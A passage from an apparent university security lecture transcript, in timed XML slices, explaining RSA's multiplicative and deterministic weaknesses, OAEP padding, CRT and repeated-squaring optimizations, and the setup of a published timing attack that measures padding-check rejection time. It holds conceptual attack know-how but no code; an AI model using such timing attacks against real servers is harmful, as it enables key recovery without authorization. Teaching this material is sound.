value m0 times m1.</text_slice>
            </slice>
            <slice>
              <time_slice>14:34</time_slice>
              <text_slice>I mean at this point,
it's not a huge problem</text_slice>
            </slice>
            <slice>
              <time_slice>14:36</time_slice>
              <text_slice>because if you aren't
able to decrypt it,</text_slice>
            </slice>
            <slice>
              <time_slice>14:38</time_slice>
              <text_slice>you're just able to construct
this encrypted message.</text_slice>
            </slice>
            <slice>
              <time_slice>14:41</time_slice>
              <text_slice>But it might be that the
overall system maybe allows you</text_slice>
            </slice>
            <slice>
              <time_slice>14:45</time_slice>
              <text_slice>to decrypt certain messages.</text_slice>
            </slice>
            <slice>
              <time_slice>14:46</time_slice>
              <text_slice>And if it allows you to decrypt
this message that you construct</text_slice>
            </slice>
            <slice>
              <time_slice>14:50</time_slice>
              <text_slice>yourself, maybe you can
now go back and figure out</text_slice>
            </slice>
            <slice>
              <time_slice>14:52</time_slice>
              <text_slice>what are these messages.</text_slice>
            </slice>
            <slice>
              <time_slice>14:53</time_slice>
              <text_slice>So it's maybe not a great plan
to be ignorant of this fact.</text_slice>
            </slice>
            <slice>
              <time_slice>15:00</time_slice>
              <text_slice>This has certainly come back
to bite a number of protocols</text_slice>
            </slice>
            <slice>
              <time_slice>15:04</time_slice>
              <text_slice>that use RSA.</text_slice>
            </slice>
            <slice>
              <time_slice>15:05</time_slice>
              <text_slice>There's one property,
we'll actually</text_slice>
            </slice>
            <slice>
              <time_slice>15:06</time_slice>
              <text_slice>use it as a defensive mechanism
towards the end of the lecture.</text_slice>
            </slice>
            <slice>
              <time_slice>15:11</time_slice>
              <text_slice>Another property of RSA that you
probably want to watch out for</text_slice>
            </slice>
            <slice>
              <time_slice>15:15</time_slice>
              <text_slice>is the fact that
it's deterministic.</text_slice>
            </slice>
            <slice>
              <time_slice>15:21</time_slice>
              <text_slice>So in this [? naive ?]
implementation</text_slice>
            </slice>
            <slice>
              <time_slice>15:23</time_slice>
              <text_slice>that I just described here,
if you take a message m</text_slice>
            </slice>
            <slice>
              <time_slice>15:27</time_slice>
              <text_slice>and you encrypt it,
you're going to get m</text_slice>
            </slice>
            <slice>
              <time_slice>15:29</time_slice>
              <text_slice>to the e mod n, which is
a deterministic function</text_slice>
            </slice>
            <slice>
              <time_slice>15:32</time_slice>
              <text_slice>of the message.</text_slice>
            </slice>
            <slice>
              <time_slice>15:33</time_slice>
              <text_slice>So if you encrypt
it again, you'll</text_slice>
            </slice>
            <slice>
              <time_slice>15:35</time_slice>
              <text_slice>get exactly the same encryption.</text_slice>
            </slice>
            <slice>
              <time_slice>15:36</time_slice>
              <text_slice>This is not surprising
but it might not</text_slice>
            </slice>
            <slice>
              <time_slice>15:38</time_slice>
              <text_slice>be a desirable
property because if I</text_slice>
            </slice>
            <slice>
              <time_slice>15:40</time_slice>
              <text_slice>see you send send some
message encrypted with RSA,</text_slice>
            </slice>
            <slice>
              <time_slice>15:44</time_slice>
              <text_slice>and I want to know what
it is, it might be hard</text_slice>
            </slice>
            <slice>
              <time_slice>15:46</time_slice>
              <text_slice>for me to decrypt it.</text_slice>
            </slice>
            <slice>
              <time_slice>15:47</time_slice>
              <text_slice>But I can try different
things and I can see,</text_slice>
            </slice>
            <slice>
              <time_slice>15:48</time_slice>
              <text_slice>well are you sending
this message?</text_slice>
            </slice>
            <slice>
              <time_slice>15:50</time_slice>
              <text_slice>I'll encrypt it and see if
you get the same ciphertext.</text_slice>
            </slice>
            <slice>
              <time_slice>15:52</time_slice>
              <text_slice>And if so, then I'll know
that's what you encrypted.</text_slice>
            </slice>
            <slice>
              <time_slice>15:54</time_slice>
              <text_slice>Because all I need to
encrypt a message is</text_slice>
            </slice>
            <slice>
              <time_slice>15:56</time_slice>
              <text_slice>the publicly known public key,
which is n and the number e.</text_slice>
            </slice>
            <slice>
              <time_slice>16:01</time_slice>
              <text_slice>So that's not so great.</text_slice>
            </slice>
            <slice>
              <time_slice>16:04</time_slice>
              <text_slice>And you might want to
watch out for this property</text_slice>
            </slice>
            <slice>
              <time_slice>16:06</time_slice>
              <text_slice>if you're actually using RSA.</text_slice>
            </slice>
            <slice>
              <time_slice>16:08</time_slice>
              <text_slice>So all of these
[? primitives are ?]</text_slice>
            </slice>
            <slice>
              <time_slice>16:10</time_slice>
              <text_slice>probably a little bit
hard to use directly.</text_slice>
            </slice>
            <slice>
              <time_slice>16:14</time_slice>
              <text_slice>What people do in
practice in order</text_slice>
            </slice>
            <slice>
              <time_slice>16:17</time_slice>
              <text_slice>to avoid these
problems with RSA is</text_slice>
            </slice>
            <slice>
              <time_slice>16:20</time_slice>
              <text_slice>they encode the message
in a certain way</text_slice>
            </slice>
            <slice>
              <time_slice>16:21</time_slice>
              <text_slice>before encrypting it.</text_slice>
            </slice>
            <slice>
              <time_slice>16:23</time_slice>
              <text_slice>Instead of directly
exponentiating a message,</text_slice>
            </slice>
            <slice>
              <time_slice>16:25</time_slice>
              <text_slice>it actually takes some
function of a message,</text_slice>
            </slice>
            <slice>
              <time_slice>16:28</time_slice>
              <text_slice>and then they encrypt that.</text_slice>
            </slice>
            <slice>
              <time_slice>16:31</time_slice>
              <text_slice>mod n.</text_slice>
            </slice>
            <slice>
              <time_slice>16:33</time_slice>
              <text_slice>And this function f, the
right one to use these days,</text_slice>
            </slice>
            <slice>
              <time_slice>16:38</time_slice>
              <text_slice>is probably something called
optimal asymmetric encryption</text_slice>
            </slice>
            <slice>
              <time_slice>16:41</time_slice>
              <text_slice>padding, O A E P.
You can look it up.</text_slice>
            </slice>
            <slice>
              <time_slice>16:45</time_slice>
              <text_slice>It's something coded that has
two interesting properties.</text_slice>
            </slice>
            <slice>
              <time_slice>16:49</time_slice>
              <text_slice>First of all, it
injects randomness.</text_slice>
            </slice>
            <slice>
              <time_slice>16:51</time_slice>
              <text_slice>You can think of f of n as
generating 1,000 bit message</text_slice>
            </slice>
            <slice>
              <time_slice>16:57</time_slice>
              <text_slice>that you're going to encrypt.</text_slice>
            </slice>
            <slice>
              <time_slice>16:58</time_slice>
              <text_slice>Part of this message is going to
be your message m in the middle</text_slice>
            </slice>
            <slice>
              <time_slice>17:01</time_slice>
              <text_slice>here.</text_slice>
            </slice>
            <slice>
              <time_slice>17:02</time_slice>
              <text_slice>So that you can get it back
when you decrypt, of course.</text_slice>
            </slice>
            <slice>
              <time_slice>17:03</time_slice>
              <text_slice>[INAUDIBLE].</text_slice>
            </slice>
            <slice>
              <time_slice>17:04</time_slice>
              <text_slice>So there's 2 interesting
things you want to do.</text_slice>
            </slice>
            <slice>
              <time_slice>17:06</time_slice>
              <text_slice>You want to put in
some randomness here,</text_slice>
            </slice>
            <slice>
              <time_slice>17:08</time_slice>
              <text_slice>some value r so that when
you encrypt the message</text_slice>
            </slice>
            <slice>
              <time_slice>17:10</time_slice>
              <text_slice>multiple times, you'll
get different results out</text_slice>
            </slice>
            <slice>
              <time_slice>17:12</time_slice>
              <text_slice>of each time so then it's
not deterministic anymore.</text_slice>
            </slice>
            <slice>
              <time_slice>17:16</time_slice>
              <text_slice>And in order to defeat this
multiplicative property</text_slice>
            </slice>
            <slice>
              <time_slice>17:18</time_slice>
              <text_slice>and other kinds of
problems, you're</text_slice>
            </slice>
            <slice>
              <time_slice>17:20</time_slice>
              <text_slice>going to put in some
fixed padding here.</text_slice>
            </slice>
            <slice>
              <time_slice>17:23</time_slice>
              <text_slice>You can think of this as
an altering sequence of 1 0</text_slice>
            </slice>
            <slice>
              <time_slice>17:25</time_slice>
              <text_slice>1 0 1 0.</text_slice>
            </slice>
            <slice>
              <time_slice>17:27</time_slice>
              <text_slice>You can do better things.</text_slice>
            </slice>
            <slice>
              <time_slice>17:28</time_slice>
              <text_slice>But roughly it's some
predictable sequence</text_slice>
            </slice>
            <slice>
              <time_slice>17:30</time_slice>
              <text_slice>that you put in here and
whenever you decrypt,</text_slice>
            </slice>
            <slice>
              <time_slice>17:33</time_slice>
              <text_slice>you make sure the
sequence is still there.</text_slice>
            </slice>
            <slice>
              <time_slice>17:35</time_slice>
              <text_slice>Even in multiplication
it's going</text_slice>
            </slice>
            <slice>
              <time_slice>17:37</time_slice>
              <text_slice>to destroy this bit power.</text_slice>
            </slice>
            <slice>
              <time_slice>17:40</time_slice>
              <text_slice>And then you should be
clear that someone tampered</text_slice>
            </slice>
            <slice>
              <time_slice>17:43</time_slice>
              <text_slice>with my message and reject it.</text_slice>
            </slice>
            <slice>
              <time_slice>17:46</time_slice>
              <text_slice>And if it's still there, then
presumably, sometimes provably,</text_slice>
            </slice>
            <slice>
              <time_slice>17:51</time_slice>
              <text_slice>no one tampered with your
message, and as a result</text_slice>
            </slice>
            <slice>
              <time_slice>17:53</time_slice>
              <text_slice>you should be able to accept it.</text_slice>
            </slice>
            <slice>
              <time_slice>17:55</time_slice>
              <text_slice>And treat message m as
correctly encrypted by someone.</text_slice>
            </slice>
            <slice>
              <time_slice>17:59</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>18:00</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>18:01</time_slice>
              <text_slice>AUDIENCE: If the attacker knows
how big the pad is, can't they</text_slice>
            </slice>
            <slice>
              <time_slice>18:05</time_slice>
              <text_slice>put a 1 in the lowest
place and then [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>18:10</time_slice>
              <text_slice>under multiplication?</text_slice>
            </slice>
            <slice>
              <time_slice>18:13</time_slice>
              <text_slice>PROFESSOR: Yeah, maybe.</text_slice>
            </slice>
            <slice>
              <time_slice>18:14</time_slice>
              <text_slice>It's a little bit tricky
because this randomness</text_slice>
            </slice>
            <slice>
              <time_slice>18:16</time_slice>
              <text_slice>is going to bleed over.</text_slice>
            </slice>
            <slice>
              <time_slice>18:17</time_slice>
              <text_slice>So the particular
construction of this O A E P</text_slice>
            </slice>
            <slice>
              <time_slice>18:20</time_slice>
              <text_slice>is a little bit more
sophisticated than this.</text_slice>
            </slice>
            <slice>
              <time_slice>18:22</time_slice>
              <text_slice>But if you imagine
this is integer</text_slice>
            </slice>
            <slice>
              <time_slice>18:25</time_slice>
              <text_slice>multiplication not
bit-wise multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>18:28</time_slice>
              <text_slice>And so this randomness is
going to bleed over somewhere,</text_slice>
            </slice>
            <slice>
              <time_slice>18:31</time_slice>
              <text_slice>and you can construct
O A E P scheme such</text_slice>
            </slice>
            <slice>
              <time_slice>18:34</time_slice>
              <text_slice>that this doesn't happen.</text_slice>
            </slice>
            <slice>
              <time_slice>18:37</time_slice>
              <text_slice>[INAUDIBLE] Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>18:41</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>18:42</time_slice>
              <text_slice>So it turns out that
basically you shouldn't really</text_slice>
            </slice>
            <slice>
              <time_slice>18:44</time_slice>
              <text_slice>use this RSA math
directly, you should</text_slice>
            </slice>
            <slice>
              <time_slice>18:46</time_slice>
              <text_slice>use some library in
practice that implements all</text_slice>
            </slice>
            <slice>
              <time_slice>18:48</time_slice>
              <text_slice>those things correctly for you.</text_slice>
            </slice>
            <slice>
              <time_slice>18:51</time_slice>
              <text_slice>And use it just as an
encrypt/decrypt parameter.</text_slice>
            </slice>
            <slice>
              <time_slice>18:53</time_slice>
              <text_slice>But it turns out these details
will come in and matter</text_slice>
            </slice>
            <slice>
              <time_slice>18:56</time_slice>
              <text_slice>for us because we're
actually trying to figure out</text_slice>
            </slice>
            <slice>
              <time_slice>18:58</time_slice>
              <text_slice>how to break or how to attack
an existing RSA implementation.</text_slice>
            </slice>
            <slice>
              <time_slice>19:03</time_slice>
              <text_slice>So in particular the
attack from this paper</text_slice>
            </slice>
            <slice>
              <time_slice>19:07</time_slice>
              <text_slice>is going to exploit the
fact that the server is</text_slice>
            </slice>
            <slice>
              <time_slice>19:10</time_slice>
              <text_slice>going to check for this padding
when they get a message.</text_slice>
            </slice>
            <slice>
              <time_slice>19:13</time_slice>
              <text_slice>So this is how we're going to
time how long it takes a server</text_slice>
            </slice>
            <slice>
              <time_slice>19:17</time_slice>
              <text_slice>to decrypt.</text_slice>
            </slice>
            <slice>
              <time_slice>19:17</time_slice>
              <text_slice>We're going to send some random
message, or some carefully</text_slice>
            </slice>
            <slice>
              <time_slice>19:21</time_slice>
              <text_slice>constructed message.</text_slice>
            </slice>
            <slice>
              <time_slice>19:22</time_slice>
              <text_slice>But the message wasn't
constructed by taking a real m</text_slice>
            </slice>
            <slice>
              <time_slice>19:26</time_slice>
              <text_slice>and encrypting it.</text_slice>
            </slice>
            <slice>
              <time_slice>19:27</time_slice>
              <text_slice>We're going to construct a
careful ciphertext integer</text_slice>
            </slice>
            <slice>
              <time_slice>19:29</time_slice>
              <text_slice>value.</text_slice>
            </slice>
            <slice>
              <time_slice>19:31</time_slice>
              <text_slice>And the server is
going to decrypt it,</text_slice>
            </slice>
            <slice>
              <time_slice>19:33</time_slice>
              <text_slice>it's going to decrypt
to some nonsense,</text_slice>
            </slice>
            <slice>
              <time_slice>19:34</time_slice>
              <text_slice>and the padding is
going to not match</text_slice>
            </slice>
            <slice>
              <time_slice>19:36</time_slice>
              <text_slice>with a very high probability.</text_slice>
            </slice>
            <slice>
              <time_slice>19:37</time_slice>
              <text_slice>And immediately the server
is going to reject it.</text_slice>
            </slice>
            <slice>
              <time_slice>19:40</time_slice>
              <text_slice>And the reason this
is going to be good</text_slice>
            </slice>
            <slice>
              <time_slice>19:41</time_slice>
              <text_slice>for us is because it will tell
us exactly how long it took</text_slice>
            </slice>
            <slice>
              <time_slice>19:44</time_slice>
              <text_slice>the server to get to this point,
just do the RSA decryption,</text_slice>
            </slice>
            <slice>
              <time_slice>19:47</time_slice>
              <text_slice>get this message, check
the padding, and reject it.</text_slice>
            </slice>
            <slice>
              <time_slice>19:50</time_slice>
              <text_slice>So that's what we're
going to be measuring</text_slice>
            </slice>
            <slice>
              <time_slice>19:52</time_slice>
              <text_slice>in this attack from the paper.</text_slice>
            </slice>
            <slice>
              <time_slice>19:54</time_slice>
              <text_slice>Does that make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>19:55</time_slice>
              <text_slice>So there's some integrity
component to the the message</text_slice>
            </slice>
            <slice>
              <time_slice>19:57</time_slice>
              <text_slice>that allows us to time the
decryption leading up to it.</text_slice>
            </slice>
            <slice>
              <time_slice>20:02</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>20:03</time_slice>
              <text_slice>So now let's talk about how to
do you actually implement RSA.</text_slice>
            </slice>
            <slice>
              <time_slice>20:07</time_slice>
              <text_slice>So the core of it is
really this exponentiation,</text_slice>
            </slice>
            <slice>
              <time_slice>20:09</time_slice>
              <text_slice>which is not exactly
trivial to do</text_slice>
            </slice>
            <slice>
              <time_slice>20:12</time_slice>
              <text_slice>as I was mentioning earlier
because all these numbers are</text_slice>
            </slice>
            <slice>
              <time_slice>20:14</time_slice>
              <text_slice>very large integers.</text_slice>
            </slice>
            <slice>
              <time_slice>20:15</time_slice>
              <text_slice>So the message itself
is going to be at least,</text_slice>
            </slice>
            <slice>
              <time_slice>20:18</time_slice>
              <text_slice>in this paper,
1,000 bit integer.</text_slice>
            </slice>
            <slice>
              <time_slice>20:20</time_slice>
              <text_slice>And the exponent itself is
also going to be pretty large.</text_slice>
            </slice>
            <slice>
              <time_slice>20:23</time_slice>
              <text_slice>The encryption exponent
is at least well known.</text_slice>
            </slice>
            <slice>
              <time_slice>20:26</time_slice>
              <text_slice>But the decryption
exponent better</text_slice>
            </slice>
            <slice>
              <time_slice>20:27</time_slice>
              <text_slice>be also a large integer also
on the order of 1,000 bits.</text_slice>
            </slice>
            <slice>
              <time_slice>20:30</time_slice>
              <text_slice>So you have a 1,000
bit integer you</text_slice>
            </slice>
            <slice>
              <time_slice>20:32</time_slice>
              <text_slice>want to exponentiate to another
1,000 bit integer power modulo</text_slice>
            </slice>
            <slice>
              <time_slice>20:35</time_slice>
              <text_slice>some other 1,000
bit integer n that's</text_slice>
            </slice>
            <slice>
              <time_slice>20:38</time_slice>
              <text_slice>going to be a little
messy, if you just do</text_slice>
            </slice>
            <slice>
              <time_slice>20:39</time_slice>
              <text_slice>[? the naive thing. ?]
So almost everyone has</text_slice>
            </slice>
            <slice>
              <time_slice>20:42</time_slice>
              <text_slice>lots of optimizations in
their RSA implementations</text_slice>
            </slice>
            <slice>
              <time_slice>20:45</time_slice>
              <text_slice>to make this go a
little bit faster.</text_slice>
            </slice>
            <slice>
              <time_slice>20:48</time_slice>
              <text_slice>And there's four
optimizations that matter</text_slice>
            </slice>
            <slice>
              <time_slice>20:51</time_slice>
              <text_slice>for the purpose of this attack.</text_slice>
            </slice>
            <slice>
              <time_slice>20:53</time_slice>
              <text_slice>There is actually more
tricks that you can play,</text_slice>
            </slice>
            <slice>
              <time_slice>20:55</time_slice>
              <text_slice>but the most important
ones are these.</text_slice>
            </slice>
            <slice>
              <time_slice>20:57</time_slice>
              <text_slice>So first there's something
called the Chinese remainder</text_slice>
            </slice>
            <slice>
              <time_slice>21:02</time_slice>
              <text_slice>theorem, or C R T.
And just to remind you</text_slice>
            </slice>
            <slice>
              <time_slice>21:06</time_slice>
              <text_slice>from grade school or
high school maybe what</text_slice>
            </slice>
            <slice>
              <time_slice>21:10</time_slice>
              <text_slice>this remainder theorem says.</text_slice>
            </slice>
            <slice>
              <time_slice>21:12</time_slice>
              <text_slice>It actually says that
if you have two numbers</text_slice>
            </slice>
            <slice>
              <time_slice>21:16</time_slice>
              <text_slice>and you have some
value x and you know</text_slice>
            </slice>
            <slice>
              <time_slice>21:20</time_slice>
              <text_slice>that x is equal to a1 mod p.</text_slice>
            </slice>
            <slice>
              <time_slice>21:25</time_slice>
              <text_slice>And you know that x is
equal to a2 mod q, where</text_slice>
            </slice>
            <slice>
              <time_slice>21:31</time_slice>
              <text_slice>p and q are prime numbers.</text_slice>
            </slice>
            <slice>
              <time_slice>21:33</time_slice>
              <text_slice>And this modular equality
applies to the whole equation.</text_slice>
            </slice>
            <slice>
              <time_slice>21:38</time_slice>
              <text_slice>Then it turns out that there's
a unique solution to this</text_slice>
            </slice>
            <slice>
              <time_slice>21:42</time_slice>
              <text_slice>is mod p q.</text_slice>
            </slice>
            <slice>
              <time_slice>21:43</time_slice>
              <text_slice>So there's are some x equals
to some x prime mod pq.</text_slice>
            </slice>
            <slice>
              <time_slice>21:52</time_slice>
              <text_slice>And in fact, there's
a unique such x prime,</text_slice>
            </slice>
            <slice>
              <time_slice>21:55</time_slice>
              <text_slice>and it's actually very
efficient to compute.</text_slice>
            </slice>
            <slice>
              <time_slice>21:57</time_slice>
              <text_slice>So the Chinese
remainder theorem also</text_slice>
            </slice>
            <slice>
              <time_slice>21:59</time_slice>
              <text_slice>comes with an algorithm for
how to compute this unique x</text_slice>
            </slice>
            <slice>
              <time_slice>22:03</time_slice>
              <text_slice>prime that's equal to x mod pq
given the values a1 and a2 mod</text_slice>
            </slice>
            <slice>
              <time_slice>22:09</time_slice>
              <text_slice>p and q, respectively.</text_slice>
            </slice>
            <slice>
              <time_slice>22:12</time_slice>
              <text_slice>Make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>22:15</time_slice>
              <text_slice>OK, so how can you use this
Chinese remainder theorem</text_slice>
            </slice>
            <slice>
              <time_slice>22:17</time_slice>
              <text_slice>to speed up modular
exponentiation?</text_slice>
            </slice>
            <slice>
              <time_slice>22:22</time_slice>
              <text_slice>So the way this is
going to help us</text_slice>
            </slice>
            <slice>
              <time_slice>22:24</time_slice>
              <text_slice>is that if you
notice all the time</text_slice>
            </slice>
            <slice>
              <time_slice>22:26</time_slice>
              <text_slice>we're doing this computational
of some bunch of stuff modulo</text_slice>
            </slice>
            <slice>
              <time_slice>22:31</time_slice>
              <text_slice>n, which is p times q.</text_slice>
            </slice>
            <slice>
              <time_slice>22:33</time_slice>
              <text_slice>And the Chinese
remainder theorem</text_slice>
            </slice>
            <slice>
              <time_slice>22:35</time_slice>
              <text_slice>says that if you want the value
of something mod p times q,</text_slice>
            </slice>
            <slice>
              <time_slice>22:39</time_slice>
              <text_slice>it suffices to compute the
value of that thing mod p</text_slice>
            </slice>
            <slice>
              <time_slice>22:42</time_slice>
              <text_slice>and the value of
that thing mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>22:44</time_slice>
              <text_slice>And then use the Chinese
remainder theorem</text_slice>
            </slice>
            <slice>
              <time_slice>22:46</time_slice>
              <text_slice>to figure out the
unique solution to what</text_slice>
            </slice>
            <slice>
              <time_slice>22:48</time_slice>
              <text_slice>this thing is mod p times q.</text_slice>
            </slice>
            <slice>
              <time_slice>22:53</time_slice>
              <text_slice>All right, why is this faster?</text_slice>
            </slice>
            <slice>
              <time_slice>22:55</time_slice>
              <text_slice>Seems like you're basically
doing the same thing twice,</text_slice>
            </slice>
            <slice>
              <time_slice>22:58</time_slice>
              <text_slice>and that's more
work to recombine it</text_slice>
            </slice>
            <slice>
              <time_slice>23:00</time_slice>
              <text_slice>Is this going to
save me anything?</text_slice>
            </slice>
            <slice>
              <time_slice>23:02</time_slice>
              <text_slice>Yeah?</text_slice>
            </slice>
            <slice>
              <time_slice>23:02</time_slice>
              <text_slice>AUDIENCE: [INAUDIBLE]</text_slice>
            </slice>
            <slice>
              <time_slice>23:06</time_slice>
              <text_slice>PROFESSOR: Well, they're
certainly smaller,</text_slice>
            </slice>
            <slice>
              <time_slice>23:08</time_slice>
              <text_slice>they're not that smaller.</text_slice>
            </slice>
            <slice>
              <time_slice>23:09</time_slice>
              <text_slice>And so p and q, so n
is 1,000 bits, p and q</text_slice>
            </slice>
            <slice>
              <time_slice>23:11</time_slice>
              <text_slice>are both 500 bits, they're not
quite to the machine word size</text_slice>
            </slice>
            <slice>
              <time_slice>23:15</time_slice>
              <text_slice>yet.</text_slice>
            </slice>
            <slice>
              <time_slice>23:16</time_slice>
              <text_slice>But it is going to
help us because most</text_slice>
            </slice>
            <slice>
              <time_slice>23:18</time_slice>
              <text_slice>of the stuff we're doing
in this computation</text_slice>
            </slice>
            <slice>
              <time_slice>23:21</time_slice>
              <text_slice>is all these multiplications.</text_slice>
            </slice>
            <slice>
              <time_slice>23:23</time_slice>
              <text_slice>And roughly multiplication
is quadratic in the size</text_slice>
            </slice>
            <slice>
              <time_slice>23:26</time_slice>
              <text_slice>of the thing you're multiplying
because the grade school</text_slice>
            </slice>
            <slice>
              <time_slice>23:29</time_slice>
              <text_slice>method of multiplication
you take all the digits</text_slice>
            </slice>
            <slice>
              <time_slice>23:31</time_slice>
              <text_slice>and multiply them by all the
other digits in the number.</text_slice>
            </slice>
            <slice>
              <time_slice>23:34</time_slice>
              <text_slice>And as a result, doing
exponentiation multiplication</text_slice>
            </slice>
            <slice>
              <time_slice>23:38</time_slice>
              <text_slice>is roughly quadratic
in the input side.</text_slice>
            </slice>
            <slice>
              <time_slice>23:40</time_slice>
              <text_slice>So if we shrink the value of p,
we basically go from 1,000 bits</text_slice>
            </slice>
            <slice>
              <time_slice>23:46</time_slice>
              <text_slice>to 512 bits, we reduce the
size of our input by 2.</text_slice>
            </slice>
            <slice>
              <time_slice>23:49</time_slice>
              <text_slice>So this means all this
multiplication exponentiation</text_slice>
            </slice>
            <slice>
              <time_slice>23:51</time_slice>
              <text_slice>is going to be roughly
4 times cheaper.</text_slice>
            </slice>
            <slice>
              <time_slice>23:54</time_slice>
              <text_slice>So even though we do it twice,
each time is 4 times faster.</text_slice>
            </slice>
            <slice>
              <time_slice>23:58</time_slice>
              <text_slice>So overall, the
CRT optimization is</text_slice>
            </slice>
            <slice>
              <time_slice>24:01</time_slice>
              <text_slice>going to give us
basically a 2x performance</text_slice>
            </slice>
            <slice>
              <time_slice>24:04</time_slice>
              <text_slice>boost for doing any
RSA operation both,</text_slice>
            </slice>
            <slice>
              <time_slice>24:08</time_slice>
              <text_slice>in the encryption
and decryption side.</text_slice>
            </slice>
            <slice>
              <time_slice>24:10</time_slice>
              <text_slice>That make sense?</text_slice>
            </slice>
            <slice>
              <time_slice>24:14</time_slice>
              <text_slice>All right.</text_slice>
            </slice>
            <slice>
              <time_slice>24:15</time_slice>
              <text_slice>So that's the first optimization
that most people use.</text_slice>
            </slice>
            <slice>
              <time_slice>24:20</time_slice>
              <text_slice>The second thing that
most implementations do</text_slice>
            </slice>
            <slice>
              <time_slice>24:24</time_slice>
              <text_slice>is a technique called
sliding windows.</text_slice>
            </slice>
            <slice>
              <time_slice>24:32</time_slice>
              <text_slice>And we'll look at this
implementation in 2 steps</text_slice>
            </slice>
            <slice>
              <time_slice>24:36</time_slice>
              <text_slice>so this implementation is
going to be concerned with what</text_slice>
            </slice>
            <slice>
              <time_slice>24:40</time_slice>
              <text_slice>basic operations
are going to perform</text_slice>
            </slice>
            <slice>
              <time_slice>24:41</time_slice>
              <text_slice>to do this exponentiation.</text_slice>
            </slice>
            <slice>
              <time_slice>24:44</time_slice>
              <text_slice>Suppose you have some
ciphertext c that's now 500 bits</text_slice>
            </slice>
            <slice>
              <time_slice>24:49</time_slice>
              <text_slice>because you were not
doing mod p or mod q.</text_slice>
            </slice>
            <slice>
              <time_slice>24:52</time_slice>
              <text_slice>We have a 500 bit c and,
similarly, roughly a 500 bit d</text_slice>
            </slice>
            <slice>
              <time_slice>24:58</time_slice>
              <text_slice>as well.</text_slice>
            </slice>
            <slice>
              <time_slice>25:00</time_slice>
              <text_slice>So how do we raise
c to the power d?</text_slice>
            </slice>
            <slice>
              <time_slice>25:04</time_slice>
              <text_slice>I guess the stupid way
that is to take c and keep</text_slice>
            </slice>
            <slice>
              <time_slice>25:07</time_slice>
              <text_slice>multiplying d times.</text_slice>
            </slice>
            <slice>
              <time_slice>25:08</time_slice>
              <text_slice>But d is very big,
it's 2 to the 500.</text_slice>
            </slice>
            <slice>
              <time_slice>25:10</time_slice>
              <text_slice>So that's never going to finish.</text_slice>
            </slice>
            <slice>
              <time_slice>25:12</time_slice>
              <text_slice>So a more amenable,
or more performant,</text_slice>
            </slice>
            <slice>
              <time_slice>25:16</time_slice>
              <text_slice>plan is to do what's
called repeat of squaring.</text_slice>
            </slice>
            <slice>
              <time_slice>25:20</time_slice>
              <text_slice>So that's the step
before sliding windows.</text_slice>
            </slice>
            <slice>
              <time_slice>25:24</time_slice>
              <text_slice>So this technique called
repeated squaring looks</text_slice>
            </slice>
            <slice>
              <time_slice>25:31</time_slice>
              <text_slice>like this.</text_slice>
            </slice>
            <slice>
              <time_slice>25:31</time_slice>
              <text_slice>So if you want to compute
c to the power 2 x,</text_slice>
            </slice>
            <slice>
              <time_slice>25:40</time_slice>
              <text_slice>then you can actually compute
c to the x and then square it.</text_slice>
            </slice>
            <slice>
              <time_slice>25:46</time_slice>
              <text_slice>So in our naive plan,
computing c to the 2x</text_slice>
            </slice>
            <slice>
              <time_slice>25:48</time_slice>
              <text_slice>would have involved us making
twice as many iterations</text_slice>
            </slice>
            <slice>
              <time_slice>25:50</time_slice>
              <text_slice>of multiplying because it's
multiplying c twice many times.</text_slice>
            </slice>
            <slice>
              <time_slice>25:53</time_slice>
              <text_slice>But in fact, you could be
clever and just compute</text_slice>
            </slice>
            <slice>
              <time_slice>25:55</time_slice>
              <text_slice>c to the x and then
square it later.</text_slice>
            </slice>
            <slice>
              <time_slice>25:58</time_slice>
              <text_slice>So this works well,
and this means</text_slice>
            </slice>
            <slice>
              <time_slice>26:00</time_slice>
              <text_slice>that if you're computing c to
some even exponent, this works.</text_slice>
            </slice>
            <slice>
              <time_slice>26:06</time_slice>
              <text_slice>And conversely, if you're
computing c to some 2x plus 1,</text_slice>
            </slice>
            <slice>
              <time_slice>26:10</time_slice>
              <text_slice>then you could
imagine this is just</text_slice>
            </slice>
            <slice>
              <time_slice>26:11</time_slice>
              <text_slice>c to the x squared
times another c.</text_slice>
            </slice>
            <slice>
              <time_slice>26:16</time_slice>
              <text_slice>So this is what's called
repeated squaring.</text_slice>
            </slice>
            <slice>
              <time_slice>26:18</time_slice>
              <text_slice>And this now allows us to
compute these exponentiations,</text_slice>
            </slice>
            <slice>
              <time_slice>26:23</time_slice>
              <text_slice>or modular exponentiations,
in a time that's</text_slice>
            </slice>
            <slice>
              <time_slice>26:27</time_slice>
              <text_slice>basically linear in the
size of the exponent.</text_slice>
            </slice>
            <slice>
              <time_slice>26:31</time_slice>
              <text_slice>So for every bit
in the exponent,</text_slice>
            </slice>
            <slice>
              <time_slice>26:34</time_slice>
              <text_slice>we're going to either
square something</text_slice>
            </slice>
            <slice>
              <time_slice>26:37</time_slice>
              <text_slice>or square something then
do an extra multiplication.</text_slice>
            </slice>
            <slice>
              <time_slice>26:40</time_slice>
              <text_slice>So that's the plan
for repeated squaring.</text_slice>
            </slice>
            <slice>
              <time_slice>26:43</time_slice>
              <text_slice>So now we can at least have
non-embarrassing run times</text_slice>
            </slice>
            <slice>
              <time_slice>26:47</time_slice>
              <text_slice>for computing modular exponents.</text_slice>
            </slice>
            <slice>
              <time_slice>26:50</time_slice>
              <text_slice>Does this make sense, why this
is working and why it's faster?</text_slice>
            </slice>
            <slice>
              <time_slice>26:54</time_slice>
              <text_slice>All right, so what's this
sliding windows trick</text_slice>
            </slice>
            <slice>
              <time_slice>26:56</time_slice>
              <text_slice>that the paper talks about?</text_slice>
            </slice>
            <slice>
              <time_slice>26:58</time_slice>
              <text_slice>So this is a little bit
more sophisticated than this</text_slice>
            </slice>
            <slice>
              <time_slice>27:02</time_slice>
              <text_slice>repeating squaring business.</text_slice>
            </slice>
            <slice>
              <time_slice>27:04</time_slice>
              <text_slice>And basically the
squaring is going</text_slice>
            </slice>
            <slice>
              <time_slice>27:08</time_slice>
